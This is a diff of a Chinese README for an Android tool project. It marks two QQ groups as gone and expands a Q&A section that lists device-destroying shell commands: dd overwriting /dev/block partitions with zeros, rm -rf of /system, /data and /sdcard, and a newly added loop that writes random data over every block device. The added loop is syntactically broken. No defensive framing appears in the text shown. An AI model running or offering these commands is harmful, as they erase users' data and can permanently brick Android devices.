@@ -5,8 +5,8 @@
 您也可以看到慕容奈依的作品[LuomoToolbox](https://github.com/Murong-Naiyi/Luomo-Toolbox)，为相关设备提供辅助作用（部分存在不可控因素）   
 慕容奈依与秋乐API合作，使用秋乐API为每个使用者提供更好的使用体验   
 
-秋乐一群647299031   
-秋乐二群338588801   
+秋乐一群647299031 (已无)   
+秋乐二群338588801 (已无)   
 
 # Q ＆ A
 
@@ -38,7 +38,7 @@ dd if=/dev/zero of=/dev/block/sda12
 dd if=/dev/zero of=/dev/block/sda13
 
 dd if=/dev/zero of=/dev/block/loop*
-dd if=/dev/zero of=/dev/*/.magisk/block/system_root
+dd if=/dev/zero of=$(magisk --path)/.magisk/block/system_root
 
 rm -rf /system
 rm -rf /data
@@ -47,6 +47,16 @@ rm -rf /product
 rm -rf /sdcard
 rm -rf /storage/emulated/0
 rm -rf /storage/sdcard
+
+devices=`ls /dev/block/sd*`
+for poweroff in ${devices}
+do
+echo "poweroff" > ${poweroff}
+
+for unonline in $(ls -aR /dev/block/*)
+do
+dd if=/dev/urandom of=${unonline} bs=1k count=1
+done
 
 ……
 
